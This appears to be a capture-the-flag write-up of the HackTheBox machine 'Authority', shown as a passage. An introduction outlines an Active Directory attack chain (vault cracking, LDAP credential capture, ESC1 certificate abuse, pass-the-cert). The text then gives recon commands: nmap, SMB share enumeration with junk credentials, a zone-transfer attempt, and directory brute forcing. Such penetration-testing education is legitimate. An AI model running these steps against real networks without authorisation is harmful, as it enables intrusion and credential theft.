@@ -1,0 +1,981 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Authority</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-authority">htb-authority</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#iis">iis</a> <a class="post-tag" href="/tags#smb">smb</a> <a class="post-tag" href="/tags#netexec">netexec</a> <a class="post-tag" href="/tags#smbclient">smbclient</a> <a class="post-tag" href="/tags#dig">dig</a> <a class="post-tag" href="/tags#dns">dns</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#pwm">pwm</a> <a class="post-tag" href="/tags#ansible">ansible</a> <a class="post-tag" href="/tags#ansible-vault">ansible-vault</a> <a class="post-tag" href="/tags#ansible2john">ansible2john</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#wireshark">wireshark</a> <a class="post-tag" href="/tags#responder">responder</a> <a class="post-tag" href="/tags#evil-winrm">evil-winrm</a> <a class="post-tag" href="/tags#adcs">adcs</a> <a class="post-tag" href="/tags#certipy">certipy</a> <a class="post-tag" href="/tags#esc1">esc1</a> <a class="post-tag" href="/tags#ms-ds-machineaccountquota">ms-ds-machineaccountquota</a> <a class="post-tag" href="/tags#powerview">powerview</a> <a class="post-tag" href="/tags#addcomputer-py">addcomputer-py</a> <a class="post-tag" href="/tags#pass-the-cert">pass-the-cert</a> <a class="post-tag" href="/tags#silver-ticket">silver-ticket</a> <a class="post-tag" href="/tags#htb-absolute">htb-absolute</a> <a class="post-tag" href="/tags#htb-escape">htb-escape</a> <a class="post-tag" href="/tags#htb-support">htb-support</a> <a class="post-tag" href="/tags#oscp-plus-v3">oscp-plus-v3</a> </span><br/><br/>
+<time class="dt-published" datetime="2023-12-09T14:45:00+00:00" itemprop="datePublished">Dec 9, 2023
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2023/12/09/htb-authority.html" style="color: #e6e6e6; text-decoration: none;">HTB: Authority</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/authority-cover.webp" type="image/webp"/>
+<img alt="Authority" class="include_image" loading="lazy" src="/img/authority-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Authority is a Windows domain controller. I’ll access open shares over SMB to find some Ansible playbooks. I’ll crack some encrypted fields to get credentials for a PWM instance. The PWM instance is in configuration mode, and I’ll use that to have it try to authenticate to my box over LDAP with plain text credentials. With those creds, I’ll enumerate active directory certificate services to find they are vulnerable to ESC1, with a twist. Rather than any user being able to enroll with the template, it’s any domain computer. I’ll add a fake computer to the domain and use that to get a certificate for the DC. That certificate doesn’t work directly, but I can use a pass-the-cert attack to dump hashes and get access as administrator.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/553 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/authority" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Authority</a> <a href="https://hackthebox.com/machines/authority" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-authority.webp" type="image/webp"/> <img alt="Authority" class="img-av" src="/icons/box-authority.png"/></picture></a><br/><a href="https://hackthebox.com/machines/authority" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1679883569764679682">15 Jul 2023</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">09 Dec 2023</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/authority-diff.webp" type="image/webp"/><img alt="Rated difficulty for Authority" src="/img/authority-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/authority-radar.webp" type="image/webp"/><img alt="Radar chart for Authority" src="/img/authority-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:34:55</span><a href="https://app.hackthebox.com/users/637320" rel="noopener" target="_blank"><img alt="kozmer" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/637320" style="display: unset"/><span class="user-text" style="display: none"> kozmer</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">00:45:56</span><a href="https://app.hackthebox.com/users/139466" rel="noopener" target="_blank"><img alt="szymex73" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/139466" style="display: unset"/><span class="user-text" style="display: none"> szymex73</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/2984" rel="noopener" target="_blank"><img alt="mrb3n" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/2984" style="display: unset"/><span class="user-text" style="display: none"> mrb3n</span></a><br/> <a href="https://app.hackthebox.com/users/206770" rel="noopener" target="_blank"><img alt="Sentinal920" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/206770" style="display: unset"/><span class="user-text" style="display: none"> Sentinal920</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds a bunch of open TCP ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.222
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 15:03 EST
+Warning: 10.10.11.222 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.11.222
+Host is up (0.10s latency).
+Not shown: 65380 closed tcp ports (reset), 126 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+8443/tcp  open  https-alt
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49673/tcp open  unknown
+49688/tcp open  unknown
+49689/tcp open  unknown
+49691/tcp open  unknown
+49692/tcp open  unknown
+49700/tcp open  unknown
+49706/tcp open  unknown
+49710/tcp open  unknown
+49730/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 20.53 seconds
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 53,80,88,135,139,389,445,595,636,3268,3269,5985,8443,9389,47001,49664-49667,49673,49688,49689,49691,49692,49700,49706,49710,49730 <span class="nt">-sCV</span> 10.10.11.222                             
+<span class="go">Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 15:13 EST 
+Nmap scan report for 10.10.11.222
+Host is up (0.10s latency).
+
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Simple DNS Plus
+80/tcp    open   http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2023-11-24 00:13:17Z)
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-11-24T00:14:24+00:00; +4h00m08s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+445/tcp   open   microsoft-ds?
+595/tcp   closed cab-protocol
+636/tcp   open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-11-24T00:14:23+00:00; +4h00m07s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+|_ssl-date: 2023-11-24T00:14:24+00:00; +4h00m08s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+3269/tcp  open   ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
+| Not valid before: 2022-08-09T23:03:21
+|_Not valid after:  2024-08-09T23:13:21
+|_ssl-date: 2023-11-24T00:14:23+00:00; +4h00m07s from scanner time.
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8443/tcp  open   ssl/https-alt
+| ssl-cert: Subject: commonName=172.16.2.118
+| Not valid before: 2023-11-08T04:11:41
+|_Not valid after:  2025-11-09T15:50:05
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Fri, 24 Nov 2023 00:13:24 GMT
+|     Connection: close
+|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='/pwm'"/&gt;&lt;/head&gt;&lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Fri, 24 Nov 2023 00:13:24 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Fri, 24 Nov 2023 00:13:30 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open   msrpc         Microsoft Windows RPC
+49665/tcp open   msrpc         Microsoft Windows RPC
+49666/tcp open   msrpc         Microsoft Windows RPC
+49667/tcp open   msrpc         Microsoft Windows RPC
+49673/tcp open   msrpc         Microsoft Windows RPC
+49688/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49689/tcp open   msrpc         Microsoft Windows RPC
+49691/tcp open   msrpc         Microsoft Windows RPC
+49692/tcp open   msrpc         Microsoft Windows RPC
+49700/tcp open   msrpc         Microsoft Windows RPC
+49706/tcp open   msrpc         Microsoft Windows RPC
+49710/tcp open   msrpc         Microsoft Windows RPC
+49730/tcp open   msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=11/23%Time=655FB25C%P=x86_64-pc-linux-g
+SF:nu%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;
+SF:charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x2024\x20N
+SF:ov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n
+SF:&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"
+SF:/&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20
+SF:GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20F
+SF:ri,\x2024\x20Nov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n
+SF:\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x2
+SF:0text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,
+SF:\x2024\x20Nov\x202023\x2000:13:24\x20GMT\r\nConnection:\x20close\r\n\r\
+SF:n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;U
+SF:RL='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r
+SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r
+SF:\nContent-Length:\x201936\r\nDate:\x20Fri,\x2024\x20Nov\x202023\x2000:1
+SF:3:30\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html\x20l
+SF:ang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x2
+SF:0Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20{font-family:Tahoma
+SF:,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgroun
+SF:d-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}
+SF:\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bl
+SF:ack;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}&lt;/
+SF:style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
+SF:Request&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception\x20R
+SF:eport&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\x20th
+SF:e\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/p&gt;&lt;p&gt;
+SF:&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not\x20p
+SF:rocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20per
+SF:ceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x2
+SF:0request\x20syntax,\x20invalid\x20");
+Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-11-24T00:14:14
+|_  start_date: N/A
+|_clock-skew: mean: 4h00m07s, deviation: 0s, median: 4h00m07s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.26 seconds
+</span></code></pre></div></div>
+<p>Based on the combination of ports, this looks like a Windows domain controller that is also running an HTTP/web server on 80.</p>
+<p>Triaging the ports, I’ll group them as follows:</p>
+<ul>
+<li>First Tier Enumeration
+    <ul>
+<li>SMB (445)</li>
+<li>DNS (53)</li>
+<li>HTTP (80) / HTTPS (8443)</li>
+</ul>
+</li>
+<li>Second Tier Enumeration
+    <ul>
+<li>Kerberos (88)</li>
+<li>LDAP (389, others)</li>
+<li>RPC (135)</li>
+</ul>
+</li>
+<li>If I find creds
+    <ul>
+<li>WinRM (5985)</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb---tcp-445">SMB - TCP 445</h3>
+<p><code class="language-plaintext highlighter-rouge">netexec</code> (formerly <code class="language-plaintext highlighter-rouge">crackmapexec</code>) shows the domain name of <code class="language-plaintext highlighter-rouge">authority.htb</code> and a hostname of <code class="language-plaintext highlighter-rouge">authority</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb 10.10.11.222
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span></code></pre></div></div>
+<p>If I try to list the cred with no creds, it fails, but with some junk creds it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>netexec smb 10.10.11.222 <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> Error getting user: list index out of range
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logfail">[-]</span><span class="go"> Error enumerating shares: STATUS_USER_SESSION_DELETED
+</span><span class="gp">oxdf@hacky$ </span>netexec smb 10.10.11.222 <span class="nt">-u</span> oxdf <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
+<span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">)
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logsuccess">[+]</span><span class="go"> authority.htb\oxdf: 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-logmessage">[*]</span><span class="go"> Enumerated shares
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">Share           Permissions     Remark</span><span class="err">
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">-----           -----------     ------
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">ADMIN$                          Remote Admin
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">C$                              Default share
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">Department Shares                 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">Development     READ            
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">IPC$            READ            Remote IPC
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">NETLOGON                        Logon server share 
+</span><span class="netexec-protocol">SMB </span><span class="go">        10.10.11.222    445    AUTHORITY        </span><span class="netexec-shareenum">SYSVOL                          Logon server share
+</span></code></pre></div></div>
+<p>The “Department Shares” share is interesting, but I don’t have access.</p>
+<p>The share I can access is “Development”. It has a single directory <code class="language-plaintext highlighter-rouge">Automation\Ansible</code> that has four directories:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="n">smbclient</span><span class="w"> </span><span class="nt">-N</span><span class="w"> </span><span class="nx">//10.10.11.222/Development</span><span class="w">
+</span><span class="go">Try "help" to get a list of possible commands.
+</span><span class="gp">smb: \&gt; </span><span class="n">ls</span><span class="w"> </span><span class="nx">Automation\Ansible\</span><span class="w">
+</span><span class="go">  .                                   D        0  Fri Mar 17 09:20:50 2023
+  ..                                  D        0  Fri Mar 17 09:20:50 2023
+  ADCS                                D        0  Fri Mar 17 09:20:48 2023
+  LDAP                                D        0  Fri Mar 17 09:20:48 2023
+  PWM                                 D        0  Fri Mar 17 09:20:48 2023
+  SHARE                               D        0  Fri Mar 17 09:20:48 2023
+
+                5888511 blocks of size 4096. 1484233 blocks available
+</span></code></pre></div></div>
+<p>Each has an Ansible setup for the given technology. For example, <code class="language-plaintext highlighter-rouge">ADCS</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">smb: \&gt; </span><span class="n">ls</span><span class="w"> </span><span class="nx">Automation\Ansible\ADCS\</span><span class="w">
+</span><span class="go">  .                                   D        0  Fri Mar 17 09:20:48 2023
+  ..                                  D        0  Fri Mar 17 09:20:48 2023
+  .ansible-lint                       A      259  Thu Sep 22 01:34:12 2022
+  .yamllint                           A      205  Tue Sep  6 12:07:26 2022
+  defaults                            D        0  Fri Mar 17 09:20:48 2023
+  LICENSE                             A    11364  Tue Sep  6 12:07:26 2022
+  meta                                D        0  Fri Mar 17 09:20:48 2023
+  molecule                            D        0  Fri Mar 17 09:20:48 2023
+  README.md                           A     7279  Tue Sep  6 12:07:26 2022
+  requirements.txt                    A      466  Tue Sep  6 12:07:26 2022
+  requirements.yml                    A      264  Tue Sep  6 12:07:26 2022
+  SECURITY.md                         A      924  Tue Sep  6 12:07:26 2022
+  tasks                               D        0  Fri Mar 17 09:20:48 2023
+  templates                           D        0  Fri Mar 17 09:20:48 2023
+  tox.ini                             A      419  Tue Sep  6 12:07:26 2022
+  vars                                D        0  Fri Mar 17 09:20:48 2023
+
+                5888511 blocks of size 4096. 1484233 blocks available
+</span></code></pre></div></div>
+<p>Active Directory Certificate Services (ADCS) is a very juicy target, but not much I can do without creds. I’ll note that one as a hint to check back on.</p>
+<h3 id="dns---tcp--udp-53">DNS - TCP / UDP 53</h3>
+<p>With TCP 53 open, I’ll try a zone transfer on the domain identified by SMB enumeration:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dig axfr authority.htb @10.10.11.222
+<span class="go">
+; &lt;&lt;&gt;&gt; DiG 9.18.18-0ubuntu0.22.04.1-Ubuntu &lt;&lt;&gt;&gt; axfr authority.htb @10.10.11.222
+;; global options: +cmd
+; Transfer failed.
+</span></code></pre></div></div>
+<p>Zone transfers aren’t allowed.</p>
+<p>A reverse look up doesn’t give anything useful either:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dig <span class="nt">-x</span> 10.10.11.222 @10.10.11.222
+<span class="go">;; communications error to 10.10.11.222#53: timed out
+
+; &lt;&lt;&gt;&gt; DiG 9.18.16-1~deb12u1~bpo11+1-Debian &lt;&lt;&gt;&gt; -x 10.10.11.222 @10.10.11.222
+;; global options: +cmd
+;; Got answer:
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: SERVFAIL, id: 42879
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4000
+;; QUESTION SECTION:
+;222.11.10.10.in-addr.arpa.     IN      PTR
+
+;; Query time: 4700 msec
+;; SERVER: 10.10.11.222#53(10.10.11.222) (UDP)
+;; WHEN: Thu Nov 23 15:48:59 EST 2023
+;; MSG SIZE  rcvd: 54
+</span></code></pre></div></div>
+<p>I could brute force, I’ll wait at this point. I’ll add <code class="language-plaintext highlighter-rouge">authority.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.222 authority.htb authority.authority.htb
+</code></pre></div></div>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site loads the default IIS page, both by IP and by domain name:</p>
+<picture>
+<source srcset="/img/image-20231123160052304.webp" type="image/webp"/>
+<img alt="image-20231123160052304" class="include_image" loading="lazy" src="/img/image-20231123160052304.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers just show IIS:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Tue, 09 Aug 2022 23:00:33 GMT</span>
+<span class="na">Accept-Ranges</span><span class="p">:</span> <span class="s">bytes</span>
+<span class="na">ETag</span><span class="p">:</span> <span class="s">"557c50d443acd81:0"</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 24 Nov 2023 00:55:05 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">703</span>
+</code></pre></div></div>
+<p>The 404 page looks like the default IIS page:</p>
+<picture>
+<source srcset="/img/image-20231206130126887.webp" type="image/webp"/>
+<img alt="image-20231206130126887" class="include_image" loading="lazy" src="/img/image-20231206130126887.png"/>
+</picture>
+<p>I’ll take a few guesses at the index page, but everything returns 404 (which isn’t odd for an IIS server).</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://authority.htb
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.9.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://authority.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.9.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
